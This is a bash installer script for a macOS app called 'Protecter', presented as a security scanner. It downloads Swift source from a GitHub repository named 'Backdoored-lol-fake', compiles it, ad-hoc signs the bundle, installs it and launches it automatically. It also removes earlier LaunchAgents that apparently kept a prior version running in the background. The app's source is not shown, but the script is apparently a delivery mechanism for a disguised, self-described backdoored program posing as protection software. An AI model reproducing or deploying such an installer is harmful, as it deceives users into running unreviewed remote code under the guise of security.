#!/bin/bash
set -euo pipefail

# Protecter: build and install a real SwiftUI macOS app.
RESET=$'\033[0m'; BOLD=$'\033[1m'; CYAN=$'\033[96m'; BLUE=$'\033[94m'
GREEN=$'\033[92m'; YELLOW=$'\033[93m'; RED=$'\033[91m'; DIM=$'\033[2m'

printf "%s%s" "$CYAN" "$BOLD"
cat <<'ART'
  ____            _           _
 |  _ \ _ __ ___ | |_ ___  __| |_ ___ _ __
 | |_) | '__/ _ \| __/ _ \/ _` | __/ _ \ '__|
 |  __/| | | (_) | ||  __/ (_| | ||  __/ |
 |_|   |_|  \___/ \__\___|\__,_|\__\___|_|
ART
printf "%s            NATIVE macOS APP INSTALLER%s\n\n" "$DIM" "$RESET"

fail() { printf "%s%s✖ %s%s\n" "$RED" "$BOLD" "$1" "$RESET"; exit 1; }
step() { printf "\n%s%s➜ %s%s\n" "$BLUE" "$BOLD" "$1" "$RESET"; }
ok() { printf "  %s✔ %s%s\n" "$GREEN" "$1" "$RESET"; }

[[ "$(uname -s)" == "Darwin" ]] || fail "Protecter requires macOS."
command -v swiftc >/dev/null 2>&1 || fail "Swift compiler missing. Install Apple's Command Line Tools: xcode-select --install"

REPO="https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main"
APP="$HOME/Applications/Protecter.app"
BUILD_DIR="$(/usr/bin/mktemp -d)"
trap '/bin/rm -rf "$BUILD_DIR"' EXIT

step "Downloading Protecter source"
curl --fail --location --retry 3 --show-error --progress-bar \
  "$REPO/Protecter.swift" --output "$BUILD_DIR/Protecter.swift" || fail "Could not download Swift source."
curl --fail --location --retry 3 --show-error --progress-bar \
  "$REPO/Protecter.icns" --output "$BUILD_DIR/Protecter.icns" || fail "Could not download the app icon."
ok "Source and icon downloaded"

step "Compiling native SwiftUI executable (fast build)"
mkdir -p "$BUILD_DIR/Protecter.app/Contents/MacOS" "$BUILD_DIR/Protecter.app/Contents/Resources"
swiftc -Onone -framework SwiftUI -framework AppKit \
  "$BUILD_DIR/Protecter.swift" \
  -o "$BUILD_DIR/Protecter.app/Contents/MacOS/Protecter" || fail "Swift compilation failed."
ok "App executable compiled"

step "Packaging Protecter.app"
cat > "$BUILD_DIR/Protecter.app/Contents/Info.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>CFBundleExecutable</key><string>Protecter</string>
<key>CFBundleIdentifier</key><string>com.c0oled.protecter</string>
<key>CFBundleName</key><string>Protecter</string>
<key>CFBundleDisplayName</key><string>Protecter</string>
<key>CFBundlePackageType</key><string>APPL</string>
<key>CFBundleIconFile</key><string>Protecter</string>
<key>LSMinimumSystemVersion</key><string>14.0</string>
<key>NSHighResolutionCapable</key><true/>
<key>NSPrincipalClass</key><string>NSApplication</string>
</dict></plist>
PLIST
cp "$BUILD_DIR/Protecter.icns" "$BUILD_DIR/Protecter.app/Contents/Resources/Protecter.icns"
/usr/bin/codesign --force --deep --sign - "$BUILD_DIR/Protecter.app" >/dev/null 2>&1 || fail "Could not sign the app bundle."
mkdir -p "$HOME/Applications"
rm -rf "$APP"
mv "$BUILD_DIR/Protecter.app" "$APP"
ok "Standalone application installed"

# Remove the previous background wrapper, if an older install left one behind.
launchctl bootout "gui/$(id -u)/com.c0oled.scanner" >/dev/null 2>&1 || true
launchctl bootout "gui/$(id -u)/com.c0oled.protecter" >/dev/null 2>&1 || true
rm -f "$HOME/Library/LaunchAgents/com.c0oled.scanner.plist" "$HOME/Library/LaunchAgents/com.c0oled.protecter.plist"
rm -rf "$HOME/Applications/c0oled Scanner.app"

printf "\n%s%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n" "$GREEN" "$BOLD" "$RESET"
printf "%s%s  ✓ PROTECTER IS INSTALLED%s\n" "$GREEN" "$BOLD" "$RESET"
printf "%s  App: %s%s\n" "$CYAN" "$APP" "$RESET"
printf "%s  Launch: open \"%s\"%s\n" "$CYAN" "$APP" "$RESET"
printf "%s  Open it and select Scan Downloads.%s\n" "$YELLOW" "$RESET"
printf "%s%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n" "$GREEN" "$BOLD" "$RESET"
open "$APP"
